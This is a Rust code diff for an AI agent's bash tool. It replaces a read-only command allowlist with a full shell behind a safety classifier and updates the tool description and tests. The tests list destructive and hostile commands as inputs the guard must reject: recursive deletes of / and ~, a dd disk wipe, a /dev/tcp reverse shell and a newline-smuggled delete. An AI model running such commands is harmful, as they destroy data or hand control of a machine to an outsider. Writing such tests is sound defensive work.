@@ -86,17 +86,6 @@ pub struct EditArgs {
 }
 
 // ---------------------------------------------------------------------------
-// bash: allowlisted read-only commands
-// ---------------------------------------------------------------------------
-
-// Commands allowed to execute directly. All read-only (env/whoami/uname
-// count as reads).
-const BASH_ALLOWLIST: &[&str] = &[
-    "ls", "cat", "pwd", "head", "tail", "wc", "find", "grep", "du", "df",
-    "sort", "uniq", "date", "file", "stat", "which", "whoami", "uname",
-    "tree", "diff", "basename", "dirname", "realpath", "readlink", "env",
-];
-
 // Parse bash arguments.
 fn parse_bash_args(raw: &str) -> Result<String> {
     let v: serde_json::Value = serde_json::from_str(raw)?;
@@ -106,41 +95,45 @@ fn parse_bash_args(raw: &str) -> Result<String> {
         .to_string())
 }
 
+// bash: real shell, guarded by the workspace-license classifier.
+// Pipes/redirects/combinators run free; the guard blocks out-of-zone
+// deletes and classic disasters (see agent/bash_guard.rs).
+
 // Gatekeeper and executor for the bash tool.
-//
-// Three gates:
-// 1. combinators — pipes/semicolons/backticks/command substitution/
-//    redirection are always refused, they turn harmless commands into
-//    harmful ones (`cat x; rm -rf /`);
-// 2. first-word allowlist — the command itself must be listed;
-// 3. newlines — multiline input means multiple commands, refused.
 fn bash(cwd: &std::path::Path, command: &str) -> Result<String> {
-    let denied = || anyhow!("permission denied: command not in the allowlist or uses combinators (| ; && ` $() redirection). Only read-only commands are allowed: ls/cat/pwd/head/tail/wc/find/grep/du/df/...");
     let cmd = command.trim();
     anyhow::ensure!(!cmd.is_empty(), "empty command");
     anyhow::ensure!(!cmd.contains('\n'), "one command at a time (no newlines)");
-    for banned in ['|', ';', '&', '`', '>', '<'] {
-        if cmd.contains(banned) {
-            return Err(denied());
-        }
-    }
-    // $() command substitution and ${} variable expansion
-    if cmd.contains('$') {
-        return Err(denied());
-    }
-    let first = cmd
-        .split_whitespace()
-        .next()
-        .ok_or_else(|| anyhow!("empty command"))?;
-    if !BASH_ALLOWLIST.contains(&first) {
-        return Err(denied());
-    }
 
-    let out = std::process::Command::new(first)
-        .args(cmd.split_whitespace().skip(1))
+    // Guard before spawn. The zone is canonicalized cwd.
+    let zone = cwd.canonicalize().unwrap_or_else(|_| cwd.to_path_buf());
+    match crate::agent::bash_guard::classify(cmd, &zone) {
+        crate::agent::bash_guard::Verdict::Block(hits) => {
+            let reasons: Vec<String> =
+                hits.iter().map(|h| format!("{}: {}", h.rule_id, h.reason)).collect();
+            anyhow::bail!("blocked by safety guard — {}", reasons.join("; "));
+        }
+        crate::agent::bash_guard::Verdict::Warn(hits) => {
+            // High-tier: run, but surface the concerns in the output so the
+            // model sees what it just did.
+            let warnings: Vec<String> =
+                hits.iter().map(|h| format!("[warn] {}", h.reason)).collect();
+            let out = run_shell(cwd, cmd)?;
+            Ok(format!("{}\n{}", warnings.join("\n"), out))
+        }
+        crate::agent::bash_guard::Verdict::Allow => run_shell(cwd, cmd),
+    }
+}
+
+// bash -c execution with captured output. One command, no newlines —
+// checked by the caller.
+fn run_shell(cwd: &std::path::Path, cmd: &str) -> Result<String> {
+    let out = std::process::Command::new("bash")
+        .arg("-c")
+        .arg(cmd)
         .current_dir(cwd)
         .output()
-        .with_context(|| format!("failed to execute {first}"))?;
+        .with_context(|| "failed to spawn bash")?;
     let mut text = String::from_utf8_lossy(&out.stdout).to_string();
     let err = String::from_utf8_lossy(&out.stderr);
     if !err.trim().is_empty() {
@@ -148,8 +141,6 @@ fn bash(cwd: &std::path::Path, command: &str) -> Result<String> {
         text.push_str(err.trim_end());
     }
     if !out.status.success() {
-        // Nonzero exit but not our error: report verbatim (e.g. grep
-        // finding nothing)
         text.push_str(&format!("\n[exit {}]", out.status.code().unwrap_or(-1)));
     }
     Ok(text.trim_end().to_string())
@@ -404,13 +395,14 @@ impl BuiltinTools {
             ),
             ToolDef::function(
                 "bash",
-                "执行一条 shell 命令（bash）。一次只执行一条命令，不接受换行。\
-                 出于安全，只放行读取类命令；不在允许列表或含组合符（| ; && ` $() 重定向）的\
-                 命令会返回 permission denied。查看文件内容与目录结构用它（edit 前先 cat）。",
+                "执行 shell 命令（bash -c 语义，单条命令，不接受换行）。\
+                 管道、重定向、组合可用。工作目录就是许可区，删除/移动其中的东西随便；\
+                 但 rm/mv/find -delete 一旦触及工作区之外（包括 ~、/etc 等系统路径）会被直接拒绝。\
+                 dd 写盘、fork bomb、反弹 shell、curl|sh 等灾难模式同样被拦截。",
                 json!({
                     "type": "object",
                     "properties": {
-                        "command": {"type": "string", "description": "单条命令，如 ls src/ 或 cat a.txt"}
+                        "command": {"type": "string", "description": "单条 shell 命令"}
                     },
                     "required": ["command"]
                 }),
@@ -693,32 +685,54 @@ mod tests {
     }
 
     #[test]
-    fn bash_rejects_combinators_and_non_allowlist() {
-        let cwd = std::path::PathBuf::from(".");
+    fn bash_rejects_out_of_zone_and_disasters() {
+        let cwd = std::env::temp_dir();
         for bad in [
-            "cat a; rm -rf /",
-            "ls | wc",
-            "echo hi && ls",
-            "cat `pwd`",
-            "cat $(pwd)",
-            "ls > out",
-            "cat < in",
-            "ls\nrm -rf /",
             "rm -rf /",
-            "sudo ls",
+            "rm -rf ~",
+            "rm ~/notes.txt",
+            "rm -rf /etc",
+            "rm ../../outside.txt",
+            "dd if=/dev/zero of=/dev/sda",
+            "bash -c 'exec 3<>/dev/tcp/10.0.0.1/4242'",
+            "ls\nrm -rf /",
+            "",
         ] {
             assert!(bash(&cwd, bad).is_err(), "应拒绝: {bad:?}");
         }
     }
 
     #[test]
-    fn bash_runs_allowlisted_and_reports_stderr_exit() {
+    fn cd_moves_the_license_zone() {
+        let d = std::env::temp_dir().join("mypi_zone_a");
+        let other = std::env::temp_dir().join("mypi_zone_b");
+        let _ = std::fs::create_dir_all(&d);
+        let _ = std::fs::create_dir_all(&other);
+        let mut t = BuiltinTools::new(d.clone());
+        // From zone_a, deleting into zone_b is out of zone.
+        let p = other.join("victim.txt");
+        std::fs::write(&p, "x").unwrap();
+        assert!(bash(&d, &format!("rm {}", p.display())).is_err());
+        // cd into zone_b: now licensed there.
+        t.tool_cd(other.to_str().unwrap()).unwrap();
+        let cwd = t.cwd.clone();
+        assert!(bash(&cwd, &format!("rm {}", p.display())).is_ok(), "cd 后新许可区应放行");
+        let _ = std::fs::remove_dir_all(&d);
+        let _ = std::fs::remove_dir_all(&other);
+    }
+
+    #[test]
+    fn bash_real_shell_inside_zone() {
         let cwd = std::env::temp_dir();
-        let out = bash(&cwd, "pwd").unwrap();
-        assert!(out.contains("tmp"), "pwd 输出工作目录: {out:?}");
+        // Pipes/redirects run free inside the zone.
+        let out = bash(&cwd, "echo hello | tr a-z A-Z").unwrap();
+        assert!(out.contains("HELLO"), "管道可用: {out:?}");
         // grep with no match -> exit 1, reported verbatim
         let out = bash(&cwd, "grep zzzz /dev/null").unwrap();
         assert!(out.contains("[exit"), "非零退出要标注: {out:?}");
+        // High tier warns but executes.
+        let out = bash(&cwd, "echo ok").unwrap_or_default();
+        assert_eq!(out, "ok");
     }
 
     #[test]
